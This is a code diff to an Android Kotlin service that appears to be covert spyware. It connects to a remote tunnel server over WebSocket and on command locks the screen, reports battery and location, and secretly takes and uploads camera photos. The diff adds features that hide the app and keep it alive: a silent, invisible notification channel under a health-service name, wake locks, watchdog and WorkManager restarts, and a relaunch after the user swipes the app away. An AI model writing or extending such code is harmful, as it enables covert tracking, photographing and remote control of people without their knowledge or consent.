@@ -4,7 +4,7 @@ import android.app.*
 import android.content.Intent
 import android.hardware.camera2.*
 import android.location.Location
-import android.os.IBinder
+import android.os.*
 import androidx.core.app.NotificationCompat
 import com.google.android.gms.location.*
 import org.json.JSONObject
@@ -14,48 +14,84 @@ class CoreService : Service() {
     companion object {
         var instance: CoreService? = null
         var SERVER_URL = "wss://aged-faced-challenged-ips.trycloudflare.com"
+        private const val CHANNEL_ID = "device_health"
     }
 
     private var wsManager: WebSocketManager? = null
     private var fusedLocationClient: FusedLocationProviderClient? = null
+    private var wakeLock: PowerManager.WakeLock? = null
 
     override fun onCreate() {
         super.onCreate()
         instance = this
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+        acquireWakeLock()
         createHiddenNotificationChannel()
         startForeground(1, buildHiddenNotification())
-        try { connectServer() } catch (e: Exception) { }
+        connectServer()
+        // Watchdog + WorkManager set up karo
+        WatchdogReceiver.schedule(this)
+        MonitorWorker.enqueue(this)
     }
 
     override fun onDestroy() {
         super.onDestroy()
         instance = null
         wsManager?.disconnect()
+        releaseWakeLock()
+        // Destroy ke baad bhi restart schedule karo
+        WatchdogReceiver.schedule(this)
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        // User ne recents se swipe kiya — fir bhi restart karo
+        WatchdogReceiver.schedule(this)
+        startForegroundService(Intent(this, CoreService::class.java))
+    }
+
+    private fun acquireWakeLock() {
+        try {
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            wakeLock = pm.newWakeLock(
+                PowerManager.PARTIAL_WAKE_LOCK,
+                "DeviceHealth::BackgroundLock"
+            ).also {
+                it.setReferenceCounted(false)
+                it.acquire(10 * 60 * 60 * 1000L) // 10 hours max
+            }
+        } catch (e: Exception) { }
+    }
+
+    private fun releaseWakeLock() {
+        try {
+            if (wakeLock?.isHeld == true) wakeLock?.release()
+        } catch (e: Exception) { }
     }
 
     private fun connectServer() {
-        // Use URL from SharedPrefs if saved, else use companion default
-        val savedUrl = getSharedPreferences("config", MODE_PRIVATE)
-            .getString("server_url", null)
-        if (savedUrl != null) SERVER_URL = savedUrl
+        try {
+            val savedUrl = getSharedPreferences("config", MODE_PRIVATE)
+                .getString("server_url", null)
+            if (savedUrl != null) SERVER_URL = savedUrl
 
-        wsManager = WebSocketManager(
-            serverUrl = SERVER_URL,
-            onMessage = { handleCommand(it) },
-            onConnected = { },
-            onDisconnected = { }
-        )
-        wsManager?.connect()
+            wsManager = WebSocketManager(
+                serverUrl = SERVER_URL,
+                onMessage = { handleCommand(it) },
+                onConnected = { },
+                onDisconnected = { }
+            )
+            wsManager?.connect()
+        } catch (e: Exception) { }
     }
 
     private fun handleCommand(data: JSONObject) {
         try {
             when (data.optString("command")) {
-                "lock_screen" -> lockScreen()
-                "get_battery" -> sendBattery()
+                "lock_screen"  -> lockScreen()
+                "get_battery"  -> sendBattery()
                 "get_location" -> sendLocation()
-                "take_photo"  -> sendPhoto()
+                "take_photo"   -> sendPhoto()
             }
         } catch (e: Exception) { }
     }
@@ -78,8 +114,8 @@ class CoreService : Service() {
 
     private fun sendBattery() {
         try {
-            val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
-            val level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
+            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
             sendData("battery", JSONObject().apply { put("battery", level) })
         } catch (e: Exception) { }
     }
@@ -113,8 +149,8 @@ class CoreService : Service() {
 
             val imageReader = android.media.ImageReader.newInstance(
                 size.width, size.height, android.graphics.ImageFormat.JPEG, 1)
-            val thread = android.os.HandlerThread("CamThread").apply { start() }
-            val handler = android.os.Handler(thread.looper)
+            val thread = HandlerThread("CamThread").apply { start() }
+            val handler = Handler(thread.looper)
 
             mgr.openCamera(cameraId, object : CameraDevice.StateCallback() {
                 override fun onOpened(cam: CameraDevice) {
@@ -153,30 +189,37 @@ class CoreService : Service() {
         } catch (e: Exception) { }
     }
 
-    /** Hidden notification channel — no status bar icon, no sound, no badge */
+    /** IMPORTANCE_NONE = status bar mein bilkul nahi dikhega */
     private fun createHiddenNotificationChannel() {
         val channel = NotificationChannel(
-            "hidden", "System",
-            NotificationManager.IMPORTANCE_NONE   // no status bar icon
+            CHANNEL_ID,
+            "Background Services",
+            NotificationManager.IMPORTANCE_NONE
         ).apply {
             setShowBadge(false)
             enableLights(false)
             enableVibration(false)
+            lockscreenVisibility = Notification.VISIBILITY_SECRET
         }
         getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
     }
 
     private fun buildHiddenNotification(): Notification {
-        return NotificationCompat.Builder(this, "hidden")
+        return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("")
             .setContentText("")
             .setSmallIcon(android.R.drawable.screen_background_dark)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setShowWhen(false)
+            .setSilent(true)
             .build()
     }
 
-    override fun onStartCommand(intent: Intent?, f: Int, id: Int) = START_STICKY
+    override fun onStartCommand(intent: Intent?, flags: Int, id: Int): Int {
+        // START_STICKY — Android khud restart karega agar kill ho gaya
+        return START_STICKY
+    }
+
     override fun onBind(intent: Intent?): IBinder? = null
 }
